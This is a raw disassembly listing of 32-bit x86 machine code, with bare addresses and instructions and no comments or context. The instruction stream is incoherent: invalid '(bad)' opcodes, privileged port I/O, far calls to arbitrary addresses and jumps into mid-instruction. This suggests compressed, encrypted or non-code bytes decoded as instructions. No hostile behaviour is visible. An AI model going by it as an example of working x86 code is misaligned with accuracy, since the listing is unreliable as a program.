  4082bc:	out    dx,eax
  4082bd:	push   0xa85e435d
  4082c2:	mov    bh,0xdd
  4082c4:	xchg   esi,eax
  4082c5:	push   es
  4082c6:	jecxz  0x408310
  4082c8:	sbb    edx,DWORD PTR [edi+edx*2]
  4082cb:	cmc    
  4082cc:	xor    al,0x60
  4082ce:	je     0x408262
  4082d0:	and    dh,BYTE PTR [ecx]
  4082d2:	ret    
  4082d3:	repnz pushf 
  4082d5:	mov    DWORD PTR [edx-0x4926cd3a],eax
  4082db:	ss jecxz 0x4082c5
  4082de:	sub    bl,ch
  4082e0:	js     0x4082fd
  4082e2:	push   DWORD PTR [esi-0x40]
  4082e5:	dec    DWORD PTR [ecx+0x79d6aa2]
  4082eb:	sbb    DWORD PTR [ebx-0x62cc8611],eax
  4082f1:	les    esi,FWORD PTR [ecx-0x5f]
  4082f4:	das    
  4082f5:	sub    DWORD PTR [edi+eax*8+0x67],0x23
  4082fa:	mov    eax,0xd503222d
  4082ff:	pop    ss
  408300:	adc    al,0x84
  408302:	xchg   ebx,eax
  408303:	or     DWORD PTR [ecx+0x6ec05321],0x96f6a12e
  40830d:	icebp  
  40830e:	inc    ebx
  40830f:	mov    ecx,0x61ae2b6c
  408314:	in     eax,0xe3
  408316:	retf   0x7230
  408319:	sti    
  40831a:	mov    ebp,0x67342f62
  40831f:	cwde   
  408320:	adc    DWORD PTR [edi+0xda659b7],esi
  408326:	add    ebp,ebx
  408328:	stos   BYTE PTR es:[edi],al
  408329:	inc    esi
  40832a:	sbb    BYTE PTR [edi-0xc],dl
  40832d:	retf   0x6839
  408330:	mov    dl,0xe8
  408332:	xchg   edi,eax
  408333:	fldcw  WORD PTR [eax+0x3f]
  408336:	mov    dh,0x66
  408338:	jo     0x408376
  40833a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40833c:	sbb    bh,bl
  40833e:	mov    cl,0xb
  408340:	lods   eax,DWORD PTR ds:[esi]
  408341:	push   ebp
  408342:	mov    ecx,0x7c92c884
  408347:	rcl    BYTE PTR [edi-0x7b4b3afb],cl
  40834d:	sbb    al,0xe3
  40834f:	xor    dl,al
  408351:	add    bh,dl
  408353:	mov    dh,0xe2
  408355:	(bad)  
  408357:	mov    dh,0xc7
  408359:	rcl    ebp,0xca
  40835c:	loopne 0x408363
  40835e:	xor    eax,0x38e6904
  408363:	(bad)  
  408364:	(bad)  
  408366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408367:	aad    0x86
  408369:	adc    al,0x52
  40836b:	scas   al,BYTE PTR es:[edi]
  40836c:	les    ecx,FWORD PTR [ebx]
  40836e:	and    BYTE PTR [edx-0x3c],0xa9
  408372:	push   eax
  408373:	ja     0x408308
  408375:	mov    ebx,0xcfea9d06
  40837a:	push   edx
  40837b:	pusha  
  40837c:	mov    esp,0xd8bc009f
  408381:	dec    eax
  408382:	sbb    ch,BYTE PTR [edx-0x25]
  408385:	mov    ch,0x4d
  408387:	idiv   BYTE PTR [ebx-0x73f4eb73]
  40838d:	adc    bl,BYTE PTR [ecx+0x38]
  408390:	push   esp
  408391:	jmp    0x408368
  408393:	pop    edi
  408394:	rol    dh,1
  408396:	je     0x408412
  408398:	pop    ds
  408399:	and    BYTE PTR [eax+ebx*4],dl
  40839c:	fisttp WORD PTR [ebx-0x7ae887b1]
  4083a2:	push   edi
  4083a3:	mov    ds:0xfb718d4,eax
  4083a8:	ins    BYTE PTR es:[edi],dx
  4083a9:	xor    al,dh
  4083ab:	fld    QWORD PTR [eax+0x50]
  4083ae:	scas   al,BYTE PTR es:[edi]
  4083af:	out    0x9c,eax
  4083b1:	push   0x35
  4083b3:	pop    ebx
  4083b4:	dec    eax
  4083b5:	jge    0x4083bb
  4083b7:	into   
  4083b8:	in     al,0xf6
  4083ba:	out    0xd1,al
  4083bc:	cmp    BYTE PTR [ebp-0x16],ah
  4083bf:	inc    esp
  4083c0:	sbb    DWORD PTR cs:[ebp-0x1],esp
  4083c4:	xlat   BYTE PTR ds:[ebx]
  4083c5:	call   DWORD PTR [edi]
  4083c7:	mov    DWORD PTR [edx],edx
  4083c9:	jl     0x4083ec
  4083cb:	hlt    
  4083cc:	scas   al,BYTE PTR es:[edi]
  4083cd:	fisttp DWORD PTR [ecx+0x5a133763]
  4083d3:	cmp    eax,0x74eff4b2
  4083d8:	jmp    0x40840d
  4083da:	ds and al,0x35
  4083dd:	imul   edx,DWORD PTR [edx],0x3f
  4083e0:	cmp    ch,ch
  4083e2:	imul   ebp,DWORD PTR [esi-0x76154858],0x8249f72c
  4083ec:	out    0x35,al
  4083ee:	mov    esp,0x4ef45aaf
  4083f3:	cli    
  4083f4:	outs   dx,BYTE PTR ds:[esi]
  4083f5:	lahf   
  4083f6:	xchg   edi,eax
  4083f7:	cmc    
  4083f8:	fs es adc eax,0x64c16d9d
  4083ff:	les    edx,FWORD PTR [ebx+0x65]
  408402:	mov    ecx,0xffbba4e5
  408407:	mov    cl,BYTE PTR [ebp+0x272999aa]
  40840d:	fs fs sub eax,0x170269e6
  408414:	ins    BYTE PTR es:[edi],dx
  408415:	shl    DWORD PTR [ebp+0x6cee881e],1
  40841b:	int    0x16
  40841d:	xor    eax,0x3cb6a13a
  408422:	pushf  
  408423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408424:	push   ecx
  408425:	adc    ebx,edx
  408427:	adc    ecx,DWORD PTR [ebp-0x44bb3dbd]
  40842d:	xor    edx,ebx
  40842f:	pop    ebp
  408430:	ret    
  408431:	fidiv  DWORD PTR [edi-0x332a221f]
  408437:	mov    esi,0x75ba75e6
  40843c:	fsub   DWORD PTR [edi+0x59]
  40843f:	cmp    al,BYTE PTR [edi+eax*1+0x39]
  408443:	fwait
  408444:	scas   al,BYTE PTR es:[edi]
  408445:	xor    ah,0xa3
  408448:	sub    DWORD PTR [eax+eax*8-0x2e],ecx
  40844c:	icebp  
  40844d:	jle    0x4083eb
  40844f:	push   ds
  408450:	mov    esi,0x4947dd5
  408455:	popa   
  408456:	mov    ebp,0x595e8a91
  40845b:	mov    edx,0xf53ad1ce
  408460:	arpl   WORD PTR [eax],sp
  408462:	mov    eax,ds:0x28d3fb55
  408467:	es (bad) 
  408469:	leave  
  40846a:	cmp    DWORD PTR [esi-0x7b1faf6a],0x96080de7
  408474:	pop    ecx
  408475:	adc    bl,cl
  408477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408478:	jns    0x40842d
  40847a:	aaa    
  40847b:	bnd jo 0x4084d8
  40847e:	pop    ebp
  40847f:	ins    DWORD PTR es:[edi],dx
  408480:	xor    dh,cl
  408482:	adc    al,0xe1
  408484:	sbb    BYTE PTR [edi],cl
  408486:	add    BYTE PTR [eax+0x46480afa],cl
  40848c:	add    esi,DWORD PTR [ebp-0x71]
  40848f:	mov    DWORD PTR [ecx-0x3a],esi
  408492:	ret    
  408493:	addr16 pop ss
  408495:	sub    ecx,edx
  408497:	add    dh,BYTE PTR [edi-0x67]
  40849a:	mov    ds:0xce0d97d3,eax
  40849f:	dec    ebx
  4084a0:	lds    eax,FWORD PTR [edi-0x76]
  4084a3:	test   al,0xa6
  4084a5:	sub    DWORD PTR [ebx+0x5e],edi
  4084a8:	imul   edi,DWORD PTR [ebp-0x49],0xffffffd8
  4084ac:	cwde   
  4084ad:	test   DWORD PTR ds:0xe2405155,ebp
  4084b3:	in     eax,dx
  4084b4:	lea    edi,[edx-0x2c]
  4084b7:	pop    esi
  4084b8:	cld    
  4084b9:	push   eax
  4084ba:	das    
  4084bb:	pop    esi
  4084bc:	mov    ecx,0x811e4023
  4084c1:	inc    esi
  4084c2:	mov    dh,0x5e
  4084c4:	popa   
  4084c5:	das    
  4084c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084c7:	cmp    DWORD PTR [esp+ecx*8],0xbf227623
  4084ce:	add    eax,0x8a7f3030
  4084d3:	mov    WORD PTR [ebx],es
  4084d5:	pop    es
  4084d6:	js     0x40846c
  4084d8:	or     BYTE PTR [eax+ebp*1+0x439e4edd],dl
  4084df:	pop    edi
  4084e0:	in     eax,0xf1
  4084e2:	sbb    dh,cl
  4084e4:	daa    
  4084e5:	sub    al,0x34
  4084e7:	addr16 push cs
  4084e9:	push   ds
  4084ea:	test   eax,0x296aef8a
  4084ef:	adc    ah,BYTE PTR [edi+edx*8]
  4084f2:	sti    
  4084f3:	mov    BYTE PTR [ebp+0x4d],bl
  4084f6:	popf   
  4084f7:	call   0x934f581d
  4084fc:	pop    es
  4084fd:	ret    
  4084fe:	test   eax,0x5ba07978
  408503:	outs   dx,DWORD PTR ds:[esi]
  408504:	sbb    BYTE PTR [esi+edi*2],bl
  408507:	cmp    DWORD PTR [ebp+0x1e],esp
  40850a:	jecxz  0x408526
  40850c:	rol    BYTE PTR [ebx],cl
  40850e:	lods   al,BYTE PTR ds:[esi]
  40850f:	call   0x44e6d9cc
  408514:	stos   BYTE PTR es:[edi],al
  408515:	mov    dl,BYTE PTR [esi]
  408517:	mov    gs,esi
  408519:	cmc    
  40851a:	add    bl,BYTE PTR [edx+0xfe34205]
  408520:	sbb    BYTE PTR [esi-0x3ba95adc],0x22
  408527:	mov    BYTE PTR [edi+esi*2],ah
  40852a:	dec    edi
  40852b:	cmc    
  40852c:	sbb    al,0xb5
  40852e:	xchg   ecx,eax
  40852f:	push   esi
  408530:	push   esp
  408531:	aaa    
  408532:	imul   eax,ebp,0xb40c96d4
  408538:	fld    TBYTE PTR [ecx+0x7b398c9e]
  40853e:	xchg   ecx,eax
  40853f:	retf   0x7e4f
  408542:	mov    al,ds:0xfc65f556
  408547:	fcomp  QWORD PTR [ecx-0x38c81047]
  40854d:	call   0x5d59:0xdda3ece8
  408554:	inc    esi
  408555:	data16 sub al,0x21
  408558:	std    
  408559:	xor    eax,0x380cc46
  40855e:	cmc    
  40855f:	shr    BYTE PTR [ebx-0x42],0x30
  408563:	fwait
  408564:	stos   BYTE PTR es:[edi],al
  408565:	stos   BYTE PTR es:[edi],al
  408566:	cwde   
  408567:	pushf  
  408568:	test   BYTE PTR [edi-0x1d],0xd3
  40856c:	(bad)  
  40856d:	fnstcw WORD PTR [edi]
  40856f:	jo     0x40857c
  408571:	in     eax,dx
  408572:	xor    DWORD PTR [edx+eiz*1],ecx
  408575:	xor    cl,BYTE PTR [eiz*4+0x38f6746f]
  40857c:	inc    ebx
  40857d:	and    BYTE PTR [ecx+0x1126da95],ah
  408583:	or     bh,BYTE PTR [esi+ebp*8-0x2d23e17d]
  40858a:	sbb    ah,BYTE PTR [edx-0x7e93335f]
  408590:	ss jle 0x4085e3
  408593:	inc    edx
  408594:	sbb    al,0x22
  408596:	mov    dh,0x32
  408598:	fwait
  408599:	mov    al,0x3
  40859b:	mov    dh,0x57
  40859d:	mov    WORD PTR [ebx],ss
  40859f:	sar    DWORD PTR [esi-0x60],cl
  4085a2:	mov    ds:0x92fc8566,eax
  4085a7:	les    edi,FWORD PTR [edx-0x37fca253]
  4085ad:	and    eax,0x5cc6f85d
  4085b2:	mov    ch,0xb
  4085b4:	jl     0x4085fb
  4085b6:	into   
  4085b7:	(bad)  
  4085b8:	xor    BYTE PTR [ecx],bh
  4085ba:	pop    ebx
  4085bb:	test   BYTE PTR [edx+ebp*4+0x2e],bl
  4085bf:	sahf   
  4085c0:	mov    ecx,0xdfd653c
  4085c5:	mov    dl,0x49
  4085c7:	call   0x607397df
  4085cc:	sbb    esi,DWORD PTR [edx+0x5d]
  4085cf:	sahf   
  4085d0:	push   esp
  4085d1:	retf   0x2dda
  4085d4:	(bad)  
  4085d6:	cmp    eax,0x2315b4c
  4085db:	sub    edx,ebx
  4085dd:	dec    ebx
  4085de:	jle    0x40856d
  4085e0:	mov    eax,0xf22ef47f
  4085e5:	pop    esi
  4085e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085e7:	add    eax,0xb8cd4551
  4085ec:	pop    ds
  4085ed:	loopne 0x408626
  4085ef:	push   ebp
  4085f0:	adc    DWORD PTR [ebx+0x7092d9f0],0xfd9a330
  4085fa:	inc    eax
  4085fb:	(bad)  
  4085fc:	adc    ch,BYTE PTR [eax+0x37871c58]
  408602:	sbb    eax,0xec3c2e5b
  408607:	mov    esi,0xbb10ec7
  40860c:	stc    
  40860d:	dec    esi
  40860e:	int3   
  40860f:	in     al,0x43
  408611:	call   0xb77cf387
  408616:	fwait
  408617:	mov    al,bl
  408619:	cmp    ecx,edx
  40861b:	jp     0x40864f
  40861d:	xor    ebp,edi
  40861f:	cmp    esp,DWORD PTR [esi+0x6771828e]
  408625:	cli    
  408626:	xor    ah,bh
  408628:	loopne 0x4085f0
  40862a:	xor    eax,0xbd61b078
  40862f:	push   ebp
  408630:	mov    bl,0x9a
  408632:	xchg   esp,eax
  408633:	jo     0x4085e1
  408635:	aas    
  408636:	scas   eax,DWORD PTR es:[edi]
  408637:	(bad)  
  408638:	jb     0x4085c1
  40863a:	or     al,0x55
  40863c:	dec    ebx
  40863d:	mov    edi,0xe59312e8
  408642:	loope  0x40869b
  408644:	or     BYTE PTR [edi-0x7b79c8b5],cl
  40864a:	inc    ebx
  40864b:	js     0x408631
  40864d:	push   ebx
  40864e:	or     dl,cl
  408650:	out    0x96,eax
  408652:	fidiv  DWORD PTR [ecx+0x50a1a597]
  408658:	xchg   edx,eax
  408659:	jo     0x4086bf
  40865b:	or     eax,edi
  40865d:	inc    si
  40865f:	js     0x4086d3
  408661:	push   0x76
  408663:	outs   dx,DWORD PTR ds:[esi]
  408664:	dec    edi
  408665:	add    DWORD PTR [esp+ebp*2+0xaa0930],ebx
  40866c:	push   es
  40866d:	ds jno 0x40860f
  408670:	dec    edx
  408671:	test   BYTE PTR [ebx],dh
  408673:	mov    ds:0xdc4400d5,al
  408678:	mov    esi,0x6c43b063
  40867d:	outs   dx,BYTE PTR ds:[esi]
  40867e:	addr16 jg 0x4086f8
  408681:	mov    esp,0xc45a8e85
  408686:	cmp    DWORD PTR [eax-0x47b05444],esp
  40868c:	mov    ebx,gs
  40868e:	mov    edx,0x91e542ed
  408693:	sbb    BYTE PTR [edi+0x5e],0xf7
  408697:	jge    0x40864e
  408699:	sub    al,0xdc
  40869b:	arpl   WORD PTR [ecx+0x52],si
  40869e:	or     BYTE PTR [ecx+eax*1-0x39],0x5e
  4086a3:	sti    
  4086a4:	add    dl,BYTE PTR [edi+eax*8+0xb]
  4086a8:	test   WORD PTR [esi],cx
  4086ab:	mov    bh,0x6c
  4086ad:	ror    DWORD PTR [esi+0x30ecd93a],0x30
  4086b4:	pop    ebp
  4086b5:	shl    dh,0x94
  4086b8:	dec    ebp
  4086b9:	test   al,0xa
  4086bb:	dec    ebx
  4086bc:	(bad)  
  4086bd:	inc    eax
  4086be:	xchg   edi,eax
  4086bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086c0:	push   ebx
  4086c1:	push   ebp
  4086c2:	jp     0x4086b7
  4086c4:	ror    BYTE PTR [esi+ebx*8+0x29f95d9d],0xfc
  4086cc:	xor    al,0xcd
  4086ce:	scas   al,BYTE PTR es:[edi]
  4086cf:	pop    ebx
  4086d0:	lock jle 0x408678
  4086d3:	loope  0x4086e0
  4086d5:	lods   al,BYTE PTR ds:[esi]
  4086d6:	cdq    
  4086d7:	mov    ebx,0xf22e17e4
  4086dc:	cmp    eax,DWORD PTR [ecx+0x7bfe7024]
  4086e2:	jns    0x4086be
  4086e4:	jecxz  0x4086b8
  4086e6:	add    BYTE PTR [ecx+ebx*1-0x5dc4f0dd],0x75
  4086ee:	mov    dh,0x8d
  4086f0:	push   ds
  4086f1:	ds xchg esp,eax
  4086f3:	or     BYTE PTR [esi-0x2b],0x89
  4086f7:	pop    eax
  4086f8:	pop    eax
  4086f9:	push   0x8cbb35d6
  4086fe:	mov    ah,0x23
  408700:	mov    ds:0xd4ecd808,eax
  408705:	jg     0x4086f8
  408707:	rol    DWORD PTR [edx+0x61],0x7c
  40870b:	(bad)  
  40870c:	pop    eax
  40870d:	and    BYTE PTR [ebx-0x198c3411],ch
  408713:	pop    esp
  408714:	mov    dh,0x77
  408716:	out    dx,eax
  408717:	inc    esi
  408718:	fstp   TBYTE PTR [edi+esi*8+0x3c566f27]
  40871f:	fmulp  st(1),st
  408721:	ret    0x7942
  408724:	fsub   st(6),st
  408726:	inc    esp
  408727:	pop    ebp
  408728:	scas   eax,DWORD PTR es:[edi]
  408729:	out    dx,al
  40872a:	sub    BYTE PTR [ebp+0x71],ch
  40872d:	rcl    BYTE PTR [ebx],0x33
  408730:	mov    edx,0x54519890
  408735:	jmp    0x4086bd
  408737:	dec    esp
  408738:	fidivr DWORD PTR ds:0xc1b75287
  40873e:	lahf   
  40873f:	into   
  408740:	inc    ebx
  408741:	sub    ch,BYTE PTR [edx]
  408743:	ret    0xbe56
  408746:	and    eax,0x70c31e79
  40874b:	jg     0x4087b3
  40874d:	jae    0x40872b
  40874f:	test   bl,ch
  408751:	mov    ah,0x44
  408753:	dec    ebx
  408754:	loope  0x408788
  408756:	shl    DWORD PTR ds:0x8956b66b,cl
  40875c:	mov    bh,0x69
  40875e:	fcomip st,st(5)
  408760:	dec    eax
  408761:	imul   edx,DWORD PTR [edx+0x22],0x2c
  408765:	(bad)  
  408766:	test   eax,0xbb998a54
  40876b:	stos   DWORD PTR es:[edi],eax
  40876c:	(bad)
  408770:	mov    ds:0xe48e1552,al
  408775:	stc    
  408776:	imul   ebx,DWORD PTR [edx+0x548513df],0xffffffc6
  40877d:	hlt    
  40877e:	scas   eax,DWORD PTR es:[edi]
  40877f:	(bad)  
  408780:	jp     0x408733
  408782:	cwde   
  408783:	adc    dl,BYTE PTR [ecx+0x795079f1]
  408789:	ss iret 
  40878b:	leave  
  40878c:	cmp    esp,DWORD PTR [edi-0x7a216a4b]
  408792:	adc    esp,ecx
  408794:	loop   0x408756
  408796:	jo     0x40871d
  408798:	jle    0x40879a
  40879a:	lea    ecx,[ecx+edx*8]
  40879d:	dec    eax
  40879e:	jle    0x4087b7
  4087a0:	int    0x10
  4087a2:	push   ss
  4087a3:	push   ss
  4087a4:	jo     0x408820
  4087a6:	push   ebp
  4087a7:	call   0xce62aaf6
  4087ac:	and    ch,bl
  4087ae:	mov    eax,0x80e92010
  4087b3:	inc    edi
  4087b4:	or     al,0xe7
  4087b6:	js     0x408796
  4087b8:	xor    ebp,DWORD PTR [ebx]
  4087ba:	pop    es
  4087bb:	pop    ds
  4087bc:	xchg   ecx,eax
  4087bd:	call   0x216b:0x6e83367
  4087c4:	push   edi
  4087c5:	inc    edx
  4087c6:	mov    eax,0xc976a482
  4087cb:	in     al,dx
  4087cc:	and    esp,DWORD PTR [edx-0x749f16c2]
  4087d2:	outs   dx,BYTE PTR ds:[esi]
  4087d3:	(bad)  
  4087d4:	int3   
  4087d5:	inc    ebp
  4087d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d7:	pusha  
  4087d8:	inc    esi
  4087d9:	out    dx,eax
  4087da:	idiv   BYTE PTR [esi-0x732527f8]
  4087e0:	mov    ebx,0xd0829826
  4087e5:	int    0xeb
  4087e7:	mov    ds:0x704fef50,eax
  4087ec:	data16 (bad) 
  4087ee:	push   cs
  4087ef:	inc    esp
  4087f0:	jecxz  0x40884b
  4087f2:	adc    BYTE PTR [edx-0xf],ch
  4087f5:	cld    
  4087f6:	push   edx
  4087f7:	adc    bl,dl
  4087f9:	push   es
  4087fa:	fadd   QWORD PTR [ebx+0x3fbcb74f]
  408800:	dec    eax
  408801:	pop    es
  408802:	sub    eax,0x82f267b0
  408807:	sti    
  408808:	mov    dl,0xb2
  40880a:	push   esi
  40880b:	sub    edx,edx
  40880d:	dec    eax
  40880e:	popa   
  40880f:	clc    
  408810:	push   ds
  408811:	mov    al,0xd9
  408813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408814:	sub    bl,BYTE PTR [ecx-0x5a157383]
  40881a:	cmp    DWORD PTR [ecx],esi
  40881c:	pusha  
  40881d:	push   ecx
  40881e:	cmp    DWORD PTR [esi-0x7a],ebp
  408821:	loope  0x4087be
  408823:	mov    bh,0x23
  408825:	icebp  
  408826:	jbe    0x408831
  408828:	add    cl,dh
  40882a:	mov    ch,0x94
  40882c:	addr16 popf 
  40882e:	mov    dh,0x14
  408830:	jnp    0x408838
  408832:	inc    esp
  408833:	adc    BYTE PTR [edx+0x7f],bl
  408836:	adc    eax,0xfb29682d
  40883b:	cld    
  40883c:	sub    ebx,DWORD PTR [ecx-0x6b10ed69]
  408842:	sbb    eax,0xc70a177
  408847:	stos   DWORD PTR es:[edi],eax
  408848:	mov    ah,0xe0
  40884a:	(bad)  
  40884b:	retf   0x45e1
  40884e:	sbb    ch,BYTE PTR [edx-0x55479380]
  408854:	push   ds
  408855:	push   esp
  408856:	mov    esp,0xc02aaea7
  40885b:	push   esi
  40885c:	repnz int3 
  40885e:	bound  ebx,QWORD PTR [edx]
  408860:	sub    cl,cl
  408862:	push   ebp
  408863:	push   edx
  408864:	xor    eax,0xf09c66e9
  408869:	pop    es
  40886a:	dec    ebx
  40886b:	sub    al,BYTE PTR [ecx-0x535a2624]
  408871:	daa    
  408872:	pop    edi
  408873:	pusha  
  408874:	xor    dl,dh
  408876:	and    al,bl
  408878:	lea    ebp,[ecx]
  40887a:	daa    
  40887b:	xchg   ebx,eax
  40887c:	stos   BYTE PTR es:[edi],al
  40887d:	jnp    0x4088c5
  40887f:	shl    BYTE PTR [ecx+ebp*4-0x3c],cl
  408883:	loope  0x4088c1
  408885:	test   DWORD PTR [ecx-0x75],ebx
  408888:	scas   eax,DWORD PTR es:[edi]
  408889:	inc    esi
  40888a:	fidiv  WORD PTR [ecx-0x73]
  40888d:	in     al,dx
  40888e:	add    BYTE PTR gs:[ebx],ch
  408891:	retf   
  408892:	stos   BYTE PTR es:[edi],al
  408893:	stos   BYTE PTR es:[edi],al
  408894:	jmp    0x40883d
  408896:	push   cs
  408897:	call   0x35ad:0x93375ae9
  40889e:	jg     0x4088ab
  4088a0:	jl     0x4088b0
  4088a2:	icebp  
  4088a3:	cwde   
  4088a4:	cli    
  4088a5:	mov    ds:0xab797470,eax
  4088aa:	and    cl,bl
  4088ac:	es loope 0x4088c0
  4088af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088b0:	push   esi
  4088b1:	cmp    BYTE PTR [ebx],dh
  4088b3:	jmp    0x4088f8
  4088b5:	jecxz  0x40890f
  4088b7:	jbe    0x4088fa
  4088b9:	cmp    DWORD PTR [edx+0x2d],0xb32b4beb
  4088c0:	in     eax,0xa2
  4088c2:	into   
  4088c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088c4:	pop    edi
  4088c5:	rol    DWORD PTR [ebp-0x11590350],0x23
  4088cc:	cmp    al,0xee
  4088ce:	inc    esi
  4088cf:	lock inc ebx
  4088d1:	test   al,0xf3
  4088d3:	fistp  WORD PTR [ecx+0x7b6e73a7]
  4088d9:	jp     0x408886
  4088db:	dec    edi
  4088dc:	sub    al,0xde
  4088de:	jp     0x408873
  4088e0:	push   cs
  4088e1:	out    0x22,al
  4088e3:	lock mov bh,0xe4
  4088e6:	adc    eax,0x2988a803
  4088eb:	repnz es pop ecx
  4088ee:	jg     0x4088ac
  4088f0:	mov    ebx,0x527612c0
  4088f5:	mov    cl,0x69
  4088f7:	cmc    
  4088f8:	nop
  4088f9:	aaa    
  4088fa:	sub    ebp,edi
  4088fc:	xchg   DWORD PTR [ebp+0x21df33c4],esp
  408902:	ja     0x4088a8
  408904:	cmc    
  408905:	jns    0x4088c5
  408907:	or     cl,BYTE PTR ds:0x60bf019d
  40890d:	cli    
  40890e:	jno    0x408951
  408910:	fs sub al,0xc8
  408913:	pop    eax
  408914:	dec    eax
  408915:	inc    ebx
  408916:	sar    DWORD PTR [edx+0x12bcc32a],0xe5
  40891d:	out    0x66,eax
  40891f:	jle    0x408975
  408921:	sahf   
  408922:	mov    esi,DWORD PTR ds:[ecx+0x40020436]
  408929:	cmp    BYTE PTR [edi+0xa],ch
  40892c:	push   0x2774840b
  408931:	push   eax
  408932:	mov    DWORD PTR [ecx-0x7e2a2ed0],edx
  408938:	push   0x2456ea83
  40893d:	ror    DWORD PTR [ebx],0xd3
  408940:	sub    eax,0x82736df6
  408945:	jnp    0x40897c
  408947:	(bad)  
  408948:	call   FWORD PTR [edx-0x57]
  40894b:	ror    BYTE PTR [eax+edx*1],cl
  40894e:	push   ebx
  40894f:	and    esi,DWORD PTR [ebx+ebp*8]
  408952:	and    eax,0xfe19ff85
  408957:	(bad)  
  408958:	scas   eax,DWORD PTR es:[edi]
  408959:	sahf   
  40895a:	cmc    
  40895b:	cld    
  40895c:	mov    edi,DWORD PTR [ebx+0x7ee80d8b]
  408962:	icebp  
  408963:	int3   
  408964:	nop
  408965:	fcmove st,st(0)
  408967:	ret    
  408968:	push   eax
  408969:	adc    al,ah
  40896b:	aad    0xd0
  40896d:	shr    BYTE PTR [esi+0xe],cl
  408970:	push   ecx
  408971:	adc    ecx,edx
  408973:	imul   edx,DWORD PTR [edi],0xe78488f0
  408979:	xor    ah,BYTE PTR [eax]
  40897b:	sahf   
  40897c:	outs   dx,BYTE PTR ds:[esi]
  40897d:	arpl   WORD PTR ds:0x1a39a2fc,di
  408983:	inc    edx
  408984:	cmp    al,bl
  408986:	push   ss
  408987:	jecxz  0x4089d7
  408989:	fwait
  40898a:	xchg   DWORD PTR [ebx],ebx
  40898c:	outs   dx,BYTE PTR ds:[esi]
  40898d:	mov    dh,0xb
  40898f:	dec    esp
  408990:	repnz imul ebp,DWORD PTR [eax+ecx*1+0x154cc3e5],0xa828388b
  40899c:	retf   
  40899d:	in     eax,0x61
  40899f:	test   DWORD PTR [ebp+eax*2+0x24],0xcd5ffd9
  4089a7:	cmp    eax,DWORD PTR [ebp-0x1f]
  4089aa:	mov    esp,0x3dc834e7
  4089af:	lods   al,BYTE PTR ds:[esi]
  4089b0:	hlt    
  4089b1:	xor    BYTE PTR [esi+0x7becb758],cl
  4089b7:	adc    DWORD PTR [edi-0x1de0adec],eax
  4089bd:	pop    ebp
  4089be:	jge    0x408962
  4089c0:	jg     0x408963
  4089c2:	dec    edi
  4089c3:	mov    ebp,0x5b770dc3
  4089c8:	inc    ebx
  4089c9:	lods   al,BYTE PTR ds:[esi]
  4089ca:	sub    al,0xbe
  4089cc:	js     0x408960
  4089ce:	addr16 mov ebp,0xac697077
  4089d4:	mov    ebp,0x33331bd7
  4089d9:	sub    ah,BYTE PTR [edx-0x15026620]
  4089df:	arpl   WORD PTR [ecx-0x2e],dx
  4089e2:	mov    ?,WORD PTR ds:0x2001bf42
  4089e8:	loopne 0x408a62
  4089ea:	retf   
  4089eb:	and    eax,0xe28708a7
  4089f0:	lahf   
  4089f1:	sbb    eax,DWORD PTR [edx+0x39]
  4089f4:	scas   eax,DWORD PTR es:[edi]
  4089f5:	add    DWORD PTR [ecx+0x18e89e3d],ebx
  4089fb:	cmp    BYTE PTR [eax-0x2d62e182],dl
  408a01:	push   ds
  408a02:	ret    0x3716
  408a05:	retf   
  408a06:	sub    DWORD PTR [esi-0x5c],edi
  408a09:	pop    eax
  408a0a:	imul   edi,edi,0x30f9b946
  408a10:	push   cs
  408a11:	cmp    ch,BYTE PTR [esi+0x4f14308]
  408a17:	mov    esp,ecx
  408a19:	popa   
  408a1a:	and    al,0x6a
  408a1c:	jmp    0x4089f1
  408a1e:	arpl   WORD PTR [ebp-0xf],sp
  408a21:	sub    BYTE PTR [eax],bh
  408a23:	ss and BYTE PTR gs:[esi],ch
  408a27:	or     al,0xb8
  408a29:	inc    ecx
  408a2a:	xchg   cl,dh
  408a2c:	and    al,BYTE PTR [eax]
  408a2e:	xchg   DWORD PTR [eax+0x17],esp
  408a31:	mov    ds:0x9044339b,al
  408a36:	stos   BYTE PTR es:[edi],al
  408a37:	cdq    
  408a38:	push   esi
  408a39:	inc    eax
  408a3a:	jne    0x408a27
  408a3c:	push   ebp
  408a3d:	dec    edi
  408a3e:	sub    eax,0xbaffa6e9
  408a43:	mov    al,ds:0x6e37f0a
  408a48:	into   
  408a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a4a:	mov    edx,0x9f536cb9
  408a4f:	adc    eax,0xb9ef2e81
  408a54:	in     eax,dx
  408a55:	lahf   
  408a56:	cmp    DWORD PTR [ebx+0x7df714c1],edx
  408a5c:	add    eax,0x49fc1905
  408a61:	or     DWORD PTR [edx-0x16ce864c],ebp
  408a67:	pop    ebp
  408a68:	jle    0x408ae5
  408a6a:	loop   0x408a85
  408a6c:	and    cl,BYTE PTR [edi]
  408a6e:	mov    dl,0x37
  408a70:	aas    
  408a71:	xchg   ebp,eax
  408a72:	mov    esp,0xa5538810
  408a77:	dec    ecx
  408a78:	into   
  408a79:	push   cs
  408a7a:	paddsb mm4,QWORD PTR [eax-0x7f]
  408a7e:	and    dl,bl
  408a80:	dec    ebx
  408a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a82:	fild   DWORD PTR [edi]
  408a84:	jne    0x408a73
  408a86:	and    ebp,esi
  408a88:	push   0x79a9549f
  408a8d:	fimul  WORD PTR [esi-0x7f305dff]
  408a93:	adc    ebx,DWORD PTR [ebx+ecx*2]
  408a96:	jmp    0x8564bd25
  408a9b:	adc    eax,0x83e99caf
  408aa0:	es mov edi,0xd58bf77c
  408aa6:	pop    esp
  408aa7:	scas   eax,DWORD PTR es:[edi]
  408aa8:	mov    bh,0x65
  408aaa:	std    
  408aab:	out    dx,eax
  408aac:	sbb    esi,DWORD PTR [edx]
  408aae:	jmp    0x258776c2
  408ab3:	mov    ds:0x5042c1f9,al
